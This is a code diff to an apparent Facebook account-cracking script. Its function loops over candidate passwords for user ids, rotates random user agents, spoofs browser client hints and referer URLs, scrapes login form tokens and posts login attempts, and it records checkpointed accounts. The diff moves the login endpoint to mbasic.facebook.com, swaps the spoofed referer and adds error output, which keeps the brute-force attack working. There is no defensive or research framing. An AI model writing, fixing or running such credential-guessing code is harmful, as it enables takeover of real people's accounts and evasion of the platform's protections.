@@ -1909,7 +1909,7 @@ def x(uid,pwx,tl):
         for ps in pwx:
             ses = requests.Session()
             pro = random.choice(uas)
-            free_fb = session.get('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl').text
+            free_fb = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl').text
             log_data = {
 'm_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
 'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
@@ -1941,7 +1941,7 @@ def x(uid,pwx,tl):
 'content-type': 'application/x-www-form-urlencoded',
 'dpr': '2',
 'origin': 'https://m.facebook.com',
-'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=140235673279940&kid_directed_site=0&app_id=140235673279940&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
 'sec-ch-prefers-color-scheme': 'light',
 'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(110,120))}"',
 'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(110,120))}.0.{str(rr(3000,6000))}.{str(rr(110,120))}"',
@@ -1989,6 +1989,7 @@ def x(uid,pwx,tl):
                     cps.append(uid)
                     break
             else:
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop+=1
     except net_error:
